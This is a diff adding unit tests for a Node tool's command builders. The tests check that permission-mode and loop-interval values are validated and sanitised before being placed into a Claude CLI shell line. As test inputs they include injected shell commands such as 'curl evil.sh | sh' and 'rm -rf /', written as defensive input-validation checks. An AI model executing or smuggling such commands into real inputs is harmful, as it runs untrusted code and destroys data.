@@ -6,7 +6,11 @@ const assert = require('node:assert/strict');
 const fs = require('node:fs');
 const path = require('node:path');
 
-const { buildLoopCommand, buildClaudeBase } = require('../out-test/loop.js');
+const {
+  buildLoopCommand, buildClaudeBase,
+  PERMISSION_MODES, isValidPermissionMode, sanitizePermissionMode,
+  isValidLoopInterval, sanitizeLoopInterval,
+} = require('../out-test/loop.js');
 const { parseTodo } = require('../out-test/parser.js');
 const { serializeTodo } = require('../out-test/writer.js');
 
@@ -33,6 +37,43 @@ test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do
   );
   // A plain id is quoted too — harmless, and keeps one code path.
   assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus'");
+});
+
+test('isValidPermissionMode: accepts every package.json enum value, rejects anything else', () => {
+  for (const m of PERMISSION_MODES) assert.ok(isValidPermissionMode(m), `${m} is valid`);
+  assert.ok(!isValidPermissionMode('auto; curl evil.sh | sh'), 'shell injection rejected');
+  assert.ok(!isValidPermissionMode(''), 'empty rejected');
+  assert.ok(!isValidPermissionMode('AUTO'), 'case-sensitive');
+});
+
+test('sanitizePermissionMode: passes valid through, falls back to auto otherwise', () => {
+  assert.equal(sanitizePermissionMode('bypassPermissions'), 'bypassPermissions');
+  assert.equal(sanitizePermissionMode('auto; rm -rf /'), 'auto');
+  assert.equal(sanitizePermissionMode(''), 'auto');
+});
+
+test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
+  const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
+  assert.equal(line, "claude --permission-mode auto --model 'opus'");
+  assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
+});
+
+test('isValidLoopInterval: accepts <digits><s|m|h|d>, rejects garbage/injection', () => {
+  for (const ok of ['1m', '5m', '30s', '2h', '7d', '10m']) assert.ok(isValidLoopInterval(ok), `${ok} valid`);
+  for (const bad of ['', '1', 'm', '1x', '1m; ls', '-1m', '1 m', '1M']) assert.ok(!isValidLoopInterval(bad), `${bad} invalid`);
+});
+
+test('sanitizeLoopInterval falls back to 1m for invalid values', () => {
+  assert.equal(sanitizeLoopInterval('5m'), '5m');
+  assert.equal(sanitizeLoopInterval('1m; rm -rf /'), '1m');
+  assert.equal(sanitizeLoopInterval('nonsense'), '1m');
+});
+
+test('buildLoopCommand sanitizes the interval before splicing it into the prompt', () => {
+  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '5m; echo pwned');
+  assert.ok(cmd, 'a command was built');
+  assert.match(cmd, /^\/loop 1m /, 'invalid interval falls back to 1m');
+  assert.ok(!cmd.includes('pwned'), 'the injected payload never reaches the prompt');
 });
 
 test('buildLoopCommand: undefined when there is no ## Automation section', () => {
